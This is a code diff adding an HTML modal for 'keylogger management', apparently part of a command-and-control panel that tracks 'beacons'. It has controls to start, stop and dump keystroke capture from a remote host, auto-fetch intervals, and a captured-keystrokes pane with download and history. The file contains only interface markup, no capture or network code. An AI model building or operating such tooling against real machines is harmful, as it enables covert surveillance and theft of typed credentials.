@@ -1,0 +1,105 @@
+<!-- 键盘记录管理模态框 -->
+<div id="keylogModal" class="modal-overlay hidden" onclick="if(event.target===this)window.closeKeylogModal()">
+    <div class="modal-content" style="max-width: 900px; width: 90%; max-height: 85vh;">
+        <div class="modal-header">
+            <h3 class="text-lg font-semibold text-white flex items-center gap-2">
+                <i class="fas fa-keyboard text-red-400"></i>
+                键盘记录管理
+                <span id="keylogBeaconName" class="text-sm text-gray-400 ml-2"></span>
+            </h3>
+            <button onclick="window.closeKeylogModal()" class="text-gray-400 hover:text-white transition-colors">
+                <i class="fas fa-times text-xl"></i>
+            </button>
+        </div>
+
+        <div class="modal-body p-4 overflow-y-auto" style="max-height: calc(85vh - 120px);">
+            <!-- 控制面板 -->
+            <div class="flex items-center justify-between mb-4 bg-gray-800 rounded-lg p-3">
+                <div class="flex items-center gap-3">
+                    <span class="text-sm text-gray-400">状态:</span>
+                    <!-- 醒目的运行状态指示器 -->
+                    <div id="keylogRunningIndicator" class="flex items-center gap-2 px-3 py-1 rounded-full text-xs font-medium bg-gray-700 text-gray-400 transition-all duration-300">
+                        <span id="keylogRunningDot" class="w-2.5 h-2.5 rounded-full bg-gray-500 inline-block transition-all duration-300"></span>
+                        <span id="keylogStatusBadge">未知</span>
+                    </div>
+                </div>
+                <div class="flex items-center gap-2">
+                    <button onclick="window.keylogAction('status')" class="px-3 py-1.5 bg-gray-600 hover:bg-gray-500 text-white text-sm rounded transition-colors" title="查询状态">
+                        <i class="fas fa-info-circle mr-1"></i>状态
+                    </button>
+                    <button onclick="window.keylogAction('start')" class="px-3 py-1.5 bg-green-600 hover:bg-green-500 text-white text-sm rounded transition-colors" title="开始记录">
+                        <i class="fas fa-play mr-1"></i>开始
+                    </button>
+                    <button onclick="window.keylogAction('stop')" class="px-3 py-1.5 bg-red-600 hover:bg-red-500 text-white text-sm rounded transition-colors" title="停止记录">
+                        <i class="fas fa-stop mr-1"></i>停止
+                    </button>
+                    <button onclick="window.keylogAction('dump')" class="px-3 py-1.5 bg-blue-600 hover:bg-blue-500 text-white text-sm rounded transition-colors" title="获取记录">
+                        <i class="fas fa-download mr-1"></i>获取
+                    </button>
+                    <button onclick="window.loadKeylogHistory()" class="px-3 py-1.5 bg-purple-600 hover:bg-purple-500 text-white text-sm rounded transition-colors" title="查看历史">
+                        <i class="fas fa-history mr-1"></i>历史
+                    </button>
+                    <button onclick="window.clearKeylogDisplay()" class="px-3 py-1.5 bg-gray-700 hover:bg-gray-600 text-white text-sm rounded transition-colors" title="清空显示">
+                        <i class="fas fa-eraser mr-1"></i>清空
+                    </button>
+                </div>
+            </div>
+
+            <!-- 自动刷新设置 -->
+            <div class="flex items-center gap-4 mb-4 bg-gray-800/50 rounded-lg px-3 py-2">
+                <label class="flex items-center gap-2 text-sm text-gray-400 cursor-pointer">
+                    <input type="checkbox" id="keylogAutoRefresh" class="rounded bg-gray-700 border-gray-600 text-blue-500 focus:ring-blue-500" onchange="window.toggleKeylogAutoRefresh()">
+                    自动获取
+                </label>
+                <div class="flex items-center gap-1">
+                    <span class="text-sm text-gray-400">间隔:</span>
+                    <select id="keylogRefreshInterval" class="bg-gray-700 text-white text-sm rounded px-2 py-1 border border-gray-600" onchange="window.toggleKeylogAutoRefresh()">
+                        <option value="10">10秒</option>
+                        <option value="30" selected>30秒</option>
+                        <option value="60">60秒</option>
+                        <option value="120">2分钟</option>
+                    </select>
+                </div>
+                <span id="keylogAutoRefreshStatus" class="text-xs text-gray-500"></span>
+            </div>
+
+            <!-- 键盘记录输出区域 -->
+            <div class="bg-gray-900 rounded-lg border border-gray-700 overflow-hidden">
+                <div class="flex items-center justify-between bg-gray-800 px-3 py-2 border-b border-gray-700">
+                    <span class="text-sm text-gray-400">
+                        <i class="fas fa-terminal mr-1"></i>捕获的按键
+                    </span>
+                    <div class="flex items-center gap-2">
+                        <span id="keylogCharCount" class="text-xs text-gray-500">0 字符</span>
+                        <button onclick="window.copyKeylogContent()" class="text-gray-400 hover:text-white text-sm transition-colors" title="复制内容">
+                            <i class="fas fa-copy"></i>
+                        </button>
+                        <button onclick="window.downloadKeylogContent()" class="text-gray-400 hover:text-white text-sm transition-colors" title="下载为文本">
+                            <i class="fas fa-file-download"></i>
+                        </button>
+                    </div>
+                </div>
+                <div id="keylogOutput" class="p-4 font-mono text-sm text-green-300 whitespace-pre-wrap overflow-y-auto" style="min-height: 300px; max-height: 500px;">
+                    <span class="text-gray-500 italic">等待键盘记录数据...</span>
+                </div>
+            </div>
+
+            <!-- 历史记录区域（默认隐藏） -->
+            <div id="keylogHistorySection" class="hidden mt-4">
+                <div class="bg-gray-900 rounded-lg border border-gray-700 overflow-hidden">
+                    <div class="flex items-center justify-between bg-gray-800 px-3 py-2 border-b border-gray-700">
+                        <span class="text-sm text-gray-400">
+                            <i class="fas fa-history mr-1"></i>历史记录
+                        </span>
+                        <button onclick="window.clearKeylogHistory()" class="text-red-400 hover:text-red-300 text-sm transition-colors" title="清除所有历史">
+                            <i class="fas fa-trash mr-1"></i>清除历史
+                        </button>
+                    </div>
+                    <div id="keylogHistoryList" class="p-2 max-h-64 overflow-y-auto">
+                        <span class="text-gray-500 italic text-sm p-2">加载中...</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
